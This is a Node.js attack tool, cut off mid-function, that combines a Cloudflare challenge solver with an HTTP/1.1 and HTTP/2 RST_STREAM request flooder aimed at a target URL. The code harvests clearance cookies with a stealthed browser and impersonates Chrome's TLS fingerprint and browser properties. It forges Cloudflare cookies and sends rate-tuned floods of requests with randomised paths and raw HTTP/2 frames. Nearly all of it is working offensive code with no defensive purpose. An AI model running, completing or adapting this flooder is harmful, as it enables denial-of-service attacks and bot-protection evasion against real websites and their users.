// ============================================================
//  CLOUDFLARE SOLVER + RST_STREAM FLOODER (COMBINED) v1.3
//  Fixed: TLS/JA3 impersonation matching Chrome ClientHello
// ============================================================

const { connect } = require("puppeteer-real-browser");
const net = require('net');
const tls = require('tls');
const HPACK = require('hpack');
const cluster = require('cluster');
const fs = require('fs');
const https = require('https');
const os = require('os');
const axios = require('axios');
const crypto = require('crypto');
const { exec } = require('child_process');
const chalk = require('chalk');

// ============================================================
// IGNORE LISTS
// ============================================================
const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];

require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;

process
    .setMaxListeners(0)
    .on('uncaughtException', function (e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('unhandledRejection', function (e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('warning', e => {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on("SIGHUP", () => 1)
    .on("SIGCHILD", () => 1);

// ============================================================
// TLS IMPERSONATION - Chrome 131 ClientHello
// ============================================================
let chromeTlsOptions = null;
try {
    const { impersonate } = require('tls-impersonate');

    // Chrome 131 ClientHello spec (verified against tls.peet.ws/api/all)
    const chromeSpec = {
        cipherSuites: [
            0x0a0a, // GREASE
            0x1301, 0x1302, 0x1303,          // TLS 1.3 AES-GCM, AES-GCM, ChaCha20
            0xc02b, 0xc02f, 0xc02c, 0xc030,  // ECDHE-ECDSA/RSA AES GCM
            0xcca9, 0xcca8,                   // ECDHE ChaCha20
            0xc013, 0xc014,                   // ECDHE CBC
            0x009c, 0x009d,                   // RSA GCM
            0x002f, 0x0035                    // RSA CBC
        ],
        extensions: [
            { type: 0x0a0a }, // GREASE
            { type: 0x0000 }, // server_name
            { type: 0x0017 }, // extended_master_secret
            { type: 0xff01 }, // renegotiation_info
            { type: 0x000a }, // supported_groups
            { type: 0x000b }, // ec_point_formats
            { type: 0x0023 }, // session_ticket
            { type: 0x0010 }, // ALPN
            { type: 0x0005 }, // status_request
            { type: 0x000d }, // signature_algorithms
            { type: 0x0012 }, // signed_certificate_timestamp
            { type: 0x0033 }, // key_share
            { type: 0x002d }, // psk_key_exchange_modes
            { type: 0x002b }, // supported_versions
            { type: 0x001b }, // compress_certificate
            { type: 0x4469 }, // application_settings
            { type: 0x0a0a }, // GREASE
            { type: 0x0015 }  // padding
        ],
        supportedGroups: [
            0x0a0a, // GREASE
            0x001d, // X25519
            0x0017, // secp256r1
            0x0018  // secp384r1
        ],
        signatureAlgorithms: [
            0x0403, 0x0804, 0x0401,
            0x0503, 0x0805, 0x0501,
            0x0806, 0x0601,
            0x0201, 0x0203
        ],
        alpnProtocols: ['h2', 'http/1.1']
    };

    const result = impersonate(chromeSpec);
    chromeTlsOptions = result.tlsOptions;

    if (result.unsupported && result.unsupported.length > 0) {
        console.log(`\x1b[33mTLS impersonate ready (${result.unsupported.length} unsupported parts)\x1b[0m`);
    } else {
        console.log(`\x1b[32mTLS impersonate ready: Chrome 131 ClientHello\x1b[0m`);
    }
} catch (e) {
    console.log(`\x1b[31mtls-impersonate FAILED: ${e.message}\x1b[0m`);
    console.log(`\x1b[33mRun: npm install tls-impersonate (requires Node >= 24.15.0)\x1b[0m`);
    console.log(`\x1b[33mFalling back to manual cipher config - bypass akan SANGAT KURANG\x1b[0m`);
}

// ============================================================
// ARGS
// ============================================================
const reqmethod = process.argv[2];
const target = process.argv[3];
const time = process.argv[4];
const threads = process.argv[5];
const ratelimit = process.argv[6];
const cookieCount = parseInt(process.argv[7]) || 2;

const hello = process.argv.indexOf('--limit');
const limit = hello !== -1 && hello + 1 < process.argv.length ? process.argv[hello + 1] : undefined;
const shit = process.argv.indexOf('--precheck');
const shitty = shit !== -1 && shit + 1 < process.argv.length ? process.argv[shit + 1] : undefined;
const cdn = process.argv.indexOf('--cdn');
const cdn1 = cdn !== -1 && cdn + 1 < process.argv.length ? process.argv[cdn + 1] : undefined;
const queryIndex = process.argv.indexOf('--randpath');
const query = queryIndex !== -1 && queryIndex + 1 < process.argv.length ? process.argv[queryIndex + 1] : undefined;
const bfmFlagIndex = process.argv.indexOf('--bfm');
const bfmFlag = bfmFlagIndex !== -1 && bfmFlagIndex + 1 < process.argv.length ? process.argv[bfmFlagIndex + 1] : undefined;
const delayIndex = process.argv.indexOf('--delay');
const delay = delayIndex !== -1 && delayIndex + 1 < process.argv.length ? parseInt(process.argv[delayIndex + 1]) : 0;
const cookieIndex = process.argv.indexOf('--cookie');
const cookieValue = cookieIndex !== -1 && cookieIndex + 1 < process.argv.length ? process.argv[cookieIndex + 1] : undefined;
const refererIndex = process.argv.indexOf('--referer');
const refererValue = refererIndex !== -1 && refererIndex + 1 < process.argv.length ? process.argv[refererIndex + 1] : undefined;
const postdataIndex = process.argv.indexOf('--postdata');
const postdata = postdataIndex !== -1 && postdataIndex + 1 < process.argv.length ? process.argv[postdataIndex + 1] : undefined;
const randrateIndex = process.argv.indexOf('--randrate');
const randrate = randrateIndex !== -1 && randrateIndex + 1 < process.argv.length ? process.argv[randrateIndex + 1] : undefined;
const customHeadersIndex = process.argv.indexOf('--header');
const customHeaders = customHeadersIndex !== -1 && customHeadersIndex + 1 < process.argv.length ? process.argv[customHeadersIndex + 1] : undefined;
const forceHttpIndex = process.argv.indexOf('--http');
const forceHttp = forceHttpIndex !== -1 && forceHttpIndex + 1 < process.argv.length ? process.argv[forceHttpIndex + 1] == "mix" ? undefined : parseInt(process.argv[forceHttpIndex + 1]) : "mix";
const debugMode = process.argv.includes('--debug') && forceHttp != 1;

if (!reqmethod || !target || !time || !threads || !ratelimit) {
    console.clear();
    console.log(`${chalk.blue('COMBINED SOLVER + RST_STREAM v1.3')}`);
    console.log(chalk.red.underline('How to use & example:'));
    console.log(chalk.red.bold(`node ${process.argv[1]} <GET/POST> <target> <time> <threads> <ratelimit> <cookieCount> [options]`));
    console.log(`node ${process.argv[1]} GET "https://target.com?q=%RAND%" 120 16 90 5 --query 1 --debug\n`);
    console.error(chalk.yellow(`
    Options:
      --limit true/null     Bypass ratelimit site
      --query 1/2/3         Query string with rand
      --debug               Show status code
      --delay <1-50>        Set delay
      --bfm true            Set bot fight mode
      --cookie <value>      Set cookie
      --referer <value>
      --postdata <value>
      --randrate            Random rate
      --header <h>#<h>      Custom headers
      --http 1/2/mix        Force protocol
      --precheck <any>      Run precheck
      --cdn <hostname>
      --full                Full rate mode
    `));
    process.exit(1);
}

if (!target.startsWith('https://')) {
    console.error('Error protocol can only https://');
    process.exit(1);
}

// ============================================================
// REALISTIC UA POOL
// ============================================================
const REAL_UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
];

function pickRealUA() {
    return REAL_UA_POOL[Math.floor(Math.random() * REAL_UA_POOL.length)];
}

// ============================================================
// GLOBAL SESSION
// ============================================================
let session = {
    userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
};
let cookieString = "";

// ============================================================
// SOLVER: CLOUDFLARE BYPASS
// ============================================================
async function bypassCloudflareOnce(attemptNum = 1) {
    let response = null;
    let browser = null;
    let page = null;

    try {
        console.log(`\x1b[33mStarting bypass attempt ${attemptNum}...\x1b[0m`);

        response = await connect({
            headless: false,
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-dev-shm-usage',
                '--disable-accelerated-2d-canvas',
                '--no-first-run',
                '--no-zygote',
                '--disable-gpu',
                '--window-size=1920,1080',
                '--lang=en-US',
                '--disable-blink-features=AutomationControlled'
            ],
            turnstile: true,
            connectOption: { defaultViewport: null }
        });

        browser = response.browser;
        page = response.page;

        const forcedUA = pickRealUA();

        try {
            const client = await page.target().createCDPSession();
            await client.send('Network.setUserAgentOverride', {
                userAgent: forcedUA,
                acceptLanguage: 'en-US,en;q=0.9',
                platform: 'Win32',
                userAgentMetadata: {
                    brands: [
                        { brand: 'Not_A Brand', version: '8' },
                        { brand: 'Chromium', version: '131' },
                        { brand: 'Google Chrome', version: '131' }
                    ],
                    fullVersion: '131.0.0.0',
                    fullVersionList: [
                        { brand: 'Not_A Brand', version: '8.0.0.0' },
                        { brand: 'Chromium', version: '131.0.0.0' },
                        { brand: 'Google Chrome', version: '131.0.0.0' }
                    ],
                    platform: 'Windows',
                    platformVersion: '10.0.0',
                    architecture: 'x86',
                    model: '',
                    mobile: false
                }
            });
        } catch (cdpErr) {
            console.log(`\x1b[33mCDP warning: ${cdpErr.message}\x1b[0m`);
        }

        await page.setUserAgent(forcedUA);

        await page.evaluateOnNewDocument(() => {
            Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
            Object.defineProperty(navigator, 'platform', { get: () => 'Win32' });
            Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
            Object.defineProperty(navigator, 'language', { get: () => 'en-US' });
            Object.defineProperty(navigator, 'hardwareConcurrency', { get: () => 8 });
            Object.defineProperty(navigator, 'deviceMemory', { get: () => 8 });
        });

        try {
            const client = await page.target().createCDPSession();
            await client.send('Emulation.setTimezoneOverride', { timezoneId: 'Asia/Jakarta' });
            await client.send('Emulation.setLocaleOverride', { locale: 'en-US' });
        } catch (tzErr) {}

        console.log(`\x1b[33mAccessing ${target}...\x1b[0m`);

        try {
            await page.goto(target, { waitUntil: 'domcontentloaded', timeout: 60000 });
        } catch (navError) {
            console.log(`\x1b[33mAccess warning: ${navError.message}\x1b[0m`);
        }

        console.log("\x1b[33mChecking Cloudflare challenge...\x1b[0m");

        let challengeCompleted = false;
        let checkCount = 0;
        const maxChecks = 120;

        while (!challengeCompleted && checkCount < maxChecks) {
            await new Promise(r => setTimeout(r, 500));

            try {
                const cookies = await page.cookies();
                const cfClearance = cookies.find(c => c.name === "cf_clearance");
                if (cfClearance) {
                    console.log(`\x1b[32mFound cookie after ${(checkCount * 0.5).toFixed(1)}s!\x1b[0m`);
                    challengeCompleted = true;
                    break;
                }

                challengeCompleted = await page.evaluate(() => {
                    const title = (document.title || "").toLowerCase();
                    const bodyText = (document.body?.innerText || "").toLowerCase();
                    if (title.includes("just a moment") || title.includes("checking") ||
                        bodyText.includes("checking your browser") || bodyText.includes("please wait") ||
                        bodyText.includes("cloudflare")) {
                        return false;
                    }
                    return document.body && document.body.children.length > 3;
                });
            } catch (evalError) {}

            checkCount++;
            if (checkCount % 10 === 0) {
                console.log(`\x1b[33mStill checking... (${(checkCount * 0.5).toFixed(1)}s elapsed)\x1b[0m`);
            }
        }

        await new Promise(r => setTimeout(r, 1500));

        const cookies = await page.cookies();
        console.log(`\x1b[36mFound ${cookies.length} cookies in ${(checkCount * 0.5).toFixed(1)}s\x1b[0m`);

        const cfClearance = cookies.find(c => c.name === "cf_clearance");
        if (cfClearance) {
            console.log(`\x1b[32mcf_clearance: ${cfClearance.value.substring(0, 30)}...\x1b[0m`);
        }

        const finalUA = await page.evaluate(() => navigator.userAgent);
        const currentUrl = page.url();
        const pageTitle = await page.title().catch(() => "");
        const viewport = page.viewport();
        const extraHeaders = await page.evaluate(() => {
            return {
                language: navigator.language,
                languages: navigator.languages,
                platform: navigator.platform,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                hardwareConcurrency: navigator.hardwareConcurrency,
                deviceMemory: navigator.deviceMemory,
            };
        });

        console.log(`\x1b[36mFinal UA : ${finalUA}\x1b[0m`);
        console.log(`\x1b[36mPlatform : ${extraHeaders.platform}\x1b[0m`);
        console.log(`\x1b[36mTimezone : ${extraHeaders.timezone}\x1b[0m`);

        await page.close();
        await browser.close();

        return {
            cookies,
            userAgent: finalUA,
            cfClearance: cfClearance ? cfClearance.value : null,
            url: currentUrl, title: pageTitle, viewport, headers: extraHeaders,
            success: true, attemptNum
        };

    } catch (error) {
        console.log(`\x1b[31mBypass attempt ${attemptNum} failed: ${error.message}\x1b[0m`);
        try { if (page) await page.close(); if (browser) await browser.close(); } catch (e) {}
        return {
            cookies: [],
            userAgent: pickRealUA(),
            cfClearance: null, success: false, attemptNum
        };
    }
}

async function bypassCloudflareParallel(totalCount) {
    console.log("\x1b[35mCLOUDFLARE BYPASS - PARALLEL MODE\x1b[0m");
    console.log(`\x1b[36mTarget cookie count: ${totalCount}\x1b[0m`);

    const results = [];
    let attemptCount = 0;
    const concurrentBypassSessions = 5;

    while (results.length < totalCount) {
        const remaining = totalCount - results.length;
        const currentBatchSize = Math.min(concurrentBypassSessions, remaining);
        console.log(`\n\x1b[33mStarting parallel batch (${currentBatchSize} sessions)...\x1b[0m`);

        const batchPromises = [];
        for (let i = 0; i < currentBatchSize; i++) {
            attemptCount++;
            batchPromises.push(bypassCloudflareOnce(attemptCount));
        }

        const batchResults = await Promise.all(batchPromises);
        for (const result of batchResults) {
            if (result.success && result.cookies.length > 0) {
                results.push(result);
                console.log(`\x1b[32mSession ${result.attemptNum} successful! (Total: ${results.length}/${totalCount})\x1b[0m`);
            } else {
                console.log(`\x1b[31mSession ${result.attemptNum} failed\x1b[0m`);
            }
        }

        if (results.length < totalCount) {
            console.log(`\x1b[33mWaiting 2s before next batch...\x1b[0m`);
            await new Promise(r => setTimeout(r, 2000));
        }
    }

    if (results.length === 0) {
        console.log("\x1b[33mNo Cloudflare cookies obtained\x1b[0m");
        results.push({
            cookies: [],
            userAgent: pickRealUA(),
            cfClearance: null, success: true
        });
    }

    console.log(`\n\x1b[32mTotal sessions obtained: ${results.length}\x1b[0m`);
    return results;
}

function printSessionDetails(sessionObj, index) {
    const sep = "=".repeat(70);
    console.log(`\n\x1b[35m${sep}\x1b[0m`);
    console.log(`\x1b[35m  SESSION #${index + 1} (Attempt ${sessionObj.attemptNum})\x1b[0m`);
    console.log(`\x1b[35m${sep}\x1b[0m`);
    console.log(`\x1b[36mStatus          :\x1b[0m ${sessionObj.success ? "\x1b[32mSUCCESS\x1b[0m" : "\x1b[31mFAILED\x1b[0m"}`);
    console.log(`\x1b[36mTarget          :\x1b[0m ${target}`);
    if (sessionObj.url) console.log(`\x1b[36mFinal URL       :\x1b[0m ${sessionObj.url}`);
    if (sessionObj.title) console.log(`\x1b[36mPage Title      :\x1b[0m ${sessionObj.title}`);
    console.log(`\n\x1b[33m--- User Agent ---\x1b[0m`);
    console.log(`\x1b[32m${sessionObj.userAgent}\x1b[0m`);
    console.log(`\n\x1b[33m--- Cloudflare Clearance ---\x1b[0m`);
    console.log(sessionObj.cfClearance ? `\x1b[32mcf_clearance    : ${sessionObj.cfClearance}\x1b[0m` : `\x1b[31mcf_clearance    : NOT FOUND\x1b[0m`);
    console.log(`\n\x1b[33m--- Cookies (${sessionObj.cookies ? sessionObj.cookies.length : 0}) ---\x1b[0m`);
    if (sessionObj.cookies && sessionObj.cookies.length > 0) {
        sessionObj.cookies.forEach((c, i) => {
            console.log(`  [${i + 1}] \x1b[32m${c.name}\x1b[0m = ${c.value.substring(0, 80)}`);
        });
    }
    if (sessionObj.headers) {
        console.log(`\n\x1b[33m--- Browser Fingerprint ---\x1b[0m`);
        console.log(`  Language   : ${sessionObj.headers.language}`);
        console.log(`  Platform   : ${sessionObj.headers.platform}`);
        console.log(`  Timezone   : ${sessionObj.headers.timezone}`);
    }
    console.log(`\x1b[35m${sep}\x1b[0m`);
}

// ============================================================
// FLOODER STATE
// ============================================================
const statusesQ = [];
let statuses = {};
let isFull = process.argv.includes('--full');
let custom_table = 65535;
let custom_window = 6291456;
let custom_header = 262144;
let custom_update = 15663105;
let STREAMID_RESET = 0;
let timer = 0;
const timestamp = Date.now();
const timestampString = timestamp.toString().substring(0, 10);
const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";

const getRandomChar = () => {
    const alphabet = 'abcdefghijklmnopqrstuvwxyz';
    return alphabet[Math.floor(Math.random() * alphabet.length)];
};
var randomPathSuffix = '';
setInterval(() => { randomPathSuffix = `${getRandomChar()}`; }, 3333);

let hcookie = '';
const url = new URL(target);

const getExpirationTime = () => {
    const d = new Date();
    d.setHours(d.getHours() + 1);
    return d.toISOString();
};
const getRandomIP = () => `${Math.floor(Math.random()*256)}.${Math.floor(Math.random()*256)}.${Math.floor(Math.random()*256)}.${Math.floor(Math.random()*256)}`;
const createHash = (v) => Buffer.from(v).toString("base64");
const randstrrr = (len) => [...Array(len)].map(() => "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789".charAt(Math.floor(Math.random() * 62))).join("");
const randstrWithSymbols = (len) => [...Array(len)].map(() => "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789._".charAt(Math.floor(Math.random() * 64))).join("");
const timestampString1 = Math.floor(Date.now() / 1000) + 3600;

if (bfmFlag && bfmFlag.toLowerCase() === 'true') {
    hcookie = `__cf_bm=${randstrrr(42)}; cf_clearance=${randstrrr(60)}-${timestampString1}-1.2.1.1-${randstrWithSymbols(240)}; tracker=${Date.now()}; cf_chl_2=${crypto.randomBytes(24).toString("hex")}; cf_chl_prog=x11; cf_chl_rc_m=1; cf_chl_rc_i=0`;
}

if (cookieValue) {
    if (cookieValue === '%RAND%') {
        hcookie = hcookie ? `${hcookie}; ${cc(6, 6)}` : cc(6, 6);
    } else {
        hcookie = hcookie ? `${hcookie}; ${cookieValue}` : cookieValue;
    }
}

// ============================================================
// FLOODER HELPERS
// ============================================================
function encodeFrame(streamId, type, payload = "", flags = 0) {
    let frame = Buffer.alloc(9);
    frame.writeUInt32BE(payload.length << 8 | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId, 5);
    if (payload.length > 0) frame = Buffer.concat([frame, payload]);
    return frame;
}

function decodeFrame(data) {
    const lengthAndType = data.readUInt32BE(0);
    const length = lengthAndType >> 8;
    const type = lengthAndType & 0xFF;
    const flags = data.readUint8(4);
    const streamId = data.readUInt32BE(5);
    const offset = flags & 0x20 ? 5 : 0;
    let payload = Buffer.alloc(0);
    if (length > 0) {
        payload = data.subarray(9 + offset, 9 + offset + length);
        if (payload.length + offset != length) return null;
    }
    return { streamId, length, type, flags, payload };
}

function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length);
    for (let i = 0; i < settings.length; i++) {
        data.writeUInt16BE(settings[i][0], i * 6);
        data.writeUInt32BE(settings[i][1], i * 6 + 2);
    }
    return data;
}

function encodeRstStream(streamId, type, flags) {
    const frameHeader = Buffer.alloc(9);
    frameHeader.writeUInt32BE(4, 0);
    frameHeader.writeUInt8(type, 4);
    frameHeader.writeUInt8(flags, 5);
    frameHeader.writeUInt32BE(streamId, 5);
    const statusCode = Buffer.alloc(4).fill(0);
    return Buffer.concat([frameHeader, statusCode]);
}

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    for (let i = 0; i < length; i++) result += characters.charAt(Math.floor(Math.random() * characters.length));
    return result;
}

if (url.pathname.includes("%RAND%")) {
    const randomValue = randstr(6) + "&" + randstr(6);
    url.pathname = url.pathname.replace("%RAND%", randomValue);
}

function randstrr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
    let result = "";
    for (let i = 0; i < length; i++) result += characters.charAt(Math.floor(Math.random() * characters.length));
    return result;
}

function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let result = '';
    for (let i = 0; i < length; i++) result += characters[Math.floor(Math.random() * characters.length)];
    return result;
}

function cc(minLength, maxLength) {
    const characters = 'abcdefghijklmnopqrstuvwxyz';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let result = '';
    for (let i = 0; i < length; i++) result += characters[Math.floor(Math.random() * characters.length)];
    return result;
}

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

// ============================================================
// UA PARSER
// ============================================================
function parseUAFull(ua) {
    let major = 131, full = "131.0.0.0";
    let platform = "Windows";
    let platformVersion = "10.0.0";
    let arch = "x86";
    let bitness = "64";
    let platformHeader = '"Windows"';

    const chromeMatch = ua.match(/Chrome\/(\d+)\.(\d+)\.(\d+)\.(\d+)/);
    if (chromeMatch) {
        major = parseInt(chromeMatch[1]);
        full = `${chromeMatch[1]}.${chromeMatch[2]}.${chromeMatch[3]}.${chromeMatch[4]}`;
    }

    if (ua.includes("Windows")) {
        platform = "Windows";
        platformVersion = "10.0.0";
        platformHeader = '"Windows"';
        arch = "x86";
        bitness = "64";
    } else if (ua.includes("Macintosh")) {
        platform = "macOS";
        platformVersion = "14.0.0";
        platformHeader = '"macOS"';
        arch = "arm";
        bitness = "64";
    } else if (ua.includes("Linux")) {
        platform = "Linux";
        platformVersion = "0.0.0";
        platformHeader = '"Linux"';
        arch = "x86";
        bitness = "64";
    }

    let brands;
    if (major >= 128) {
        brands = `"Not_A Brand";v="8", "Chromium";v="${major}", "Google Chrome";v="${major}"`;
    } else {
        brands = `"Chromium";v="${major}", "Not_A Brand";v="8", "Google Chrome";v="${major}"`;
    }

    if (ua.includes("Brave")) {
        brands = brands.replace(`"Google Chrome";v="${major}"`, `"Brave";v="${major}"`);
    }

    const fullVersionList = brands.replace(/v="(\d+)"/g, (_, v) => `v="${v}.0.0.0"`);

    return {
        major, full, platform, platformVersion, platformHeader, arch, bitness,
        brands, fullVersionList
    };
}

// ============================================================
// BUILD HTTP/1.1 REQUEST
// ============================================================
function buildRequest() {
    const fp = parseUAFull(session.userAgent);
    const currentRefererValue = refererValue === 'rand' ? 'https://' + cc(6, 6) + ".net" : refererValue;

    let mysor = '\r\n';
    let mysor1 = '\r\n';
    if (hcookie || currentRefererValue) { mysor = '\r\n'; mysor1 = ''; }
    else { mysor = ''; mysor1 = '\r\n'; }

    let headers = `${reqmethod} ${url.pathname} HTTP/1.1\r\n` +
        `Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\n` +
        'Accept-Encoding: gzip, deflate, br, zstd\r\n' +
        'Accept-Language: en-US,en;q=0.9\r\n' +
        'Cache-Control: max-age=0\r\n' +
        'Connection: Keep-Alive\r\n' +
        `Host: ${url.hostname}\r\n` +
        'Sec-Fetch-Dest: document\r\n' +
        'Sec-Fetch-Mode: navigate\r\n' +
        'Sec-Fetch-Site: none\r\n' +
        'Sec-Fetch-User: ?1\r\n' +
        'Upgrade-Insecure-Requests: 1\r\n' +
        `User-Agent: ${session.userAgent}\r\n` +
        `sec-ch-ua: ${fp.brands}\r\n` +
        'sec-ch-ua-mobile: ?0\r\n' +
        `sec-ch-ua-platform: ${fp.platformHeader}\r\n` + mysor1;

    if (hcookie) headers += `Cookie: ${hcookie}\r\n`;
    if (currentRefererValue) headers += `Referer: ${currentRefererValue}\r\n` + mysor;

    return Buffer.from(`${headers}`, 'binary');
}

let h1payl = null;

function handleQuery(query) {
    if (query === '1') return url.pathname + '?__cf_chl_rt_tk=' + randstrrr(30) + '_' + randstrrr(12) + '-' + timestampString1 + '-0-' + 'gaNy' + randstrrr(8);
    if (query === '2') return url.pathname + `${randomPathSuffix}`;
    if (query === '3') return url.pathname + '?q=' + generateRandomString(6, 7) + '&' + generateRandomString(6, 7);
    return url.pathname;
}

const applu = new https.Agent({ rejectUnauthorized: false });
const getCurrentTime = () => {
    const now = new Date();
    return `${now.toLocaleDateString()} ${now.toLocaleTimeString()}`;
};

if (shitty) {
    const timeoutPromise = new Promise((resolve, reject) => {
        setTimeout(() => reject(new Error('Request timed out')), 5000);
    });
    const axiosPromise = axios.get(target, {
        httpsAgent: applu,
        headers: { 'User-Agent': pickRealUA() }
    });
    Promise.race([axiosPromise, timeoutPromise])
        .then(() => {})
        .catch((error) => {
            if (error.message === 'Request timed out') console.log('> Precheck: Request Timed Out');
            else if (error.response) console.log(`> Precheck: ${error.response.status}`);
            else console.log(`> Precheck: ${getCurrentTime()} ${error.message}`);
        });
}

// ============================================================
// FLOODER GO()
// ============================================================
function go() {
    h1payl = Buffer.concat(new Array(1).fill(buildRequest()));

    let tlsSocket;

    // === Build TLS connect options ===
    // Kalau chromeTlsOptions tersedia (tls-impersonate), pakai itu.
    // Fallback: manual cipher config (kurang efektif).
    const manualTlsOptions = {
        ALPNProtocols: forceHttp === 1 ? ['http/1.1'] : forceHttp === 2 ? ['h2'] : forceHttp === undefined ? Math.random() >= 0.5 ? ['h2'] : ['http/1.1'] : ['h2', 'http/1.1'],
        ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-RSA-AES128-SHA:ECDHE-RSA-AES256-SHA:AES128-GCM-SHA256:AES256-GCM-SHA384:AES128-SHA:AES256-SHA',
        sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512',
        ecdhCurve: 'X25519:P-256:P-384',
        minVersion: 'TLSv1.2',
        maxVersion: 'TLSv1.3',
        secure: true,
        rejectUnauthorized: false,
        secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_ALL
    };

    const baseTlsOptions = chromeTlsOptions
        ? { ...chromeTlsOptions, rejectUnauthorized: false }
        : manualTlsOptions;

    // Override ALPN jika forceHttp spesifik
    if (forceHttp === 1) baseTlsOptions.ALPNProtocols = ['http/1.1'];
    else if (forceHttp === 2) baseTlsOptions.ALPNProtocols = ['h2'];

    tlsSocket = tls.connect({
        host: url.hostname,
        port: 443,
        servername: url.host,
        ...baseTlsOptions
    }, () => {
        if (!tlsSocket.alpnProtocol || tlsSocket.alpnProtocol == 'http/1.1') {
            if (forceHttp == 2) { tlsSocket.end(() => tlsSocket.destroy()); return; }

            function mainH1() {
                tlsSocket.write(h1payl, (err) => {
                    if (!err) {
                        const jitter = 5 + Math.floor(Math.random() * 25);
                        setTimeout(() => mainH1(), (isFull ? 1000 : 1000 / ratelimit) + jitter);
                    } else {
                        tlsSocket.end(() => tlsSocket.destroy());
                    }
                });
            }
            mainH1();
            tlsSocket.on('error', () => tlsSocket.end(() => tlsSocket.destroy()));
            return;
        }

        if (forceHttp == 1) { tlsSocket.end(() => tlsSocket.destroy()); return; }

        let streamId = 1;
        let data = Buffer.alloc(0);
        let hpack = new HPACK();
        hpack.setTableSize(4096);

        const updateWindow = Buffer.alloc(4);
        updateWindow.writeUInt32BE(custom_update, 0);

        let oke = 12012, oke1 = 12302, oke2 = 13356;
        oke += 1; oke1 += 1; oke2 += 1;
        const frames1 = [];
        const frames = [
            Buffer.from(PREFACE, 'binary'),
            encodeFrame(0, 4, encodeSettings([
                ...(Math.random() < 0.996 ? [[1, custom_table]] : [[1, oke]]),
                [2, 0],
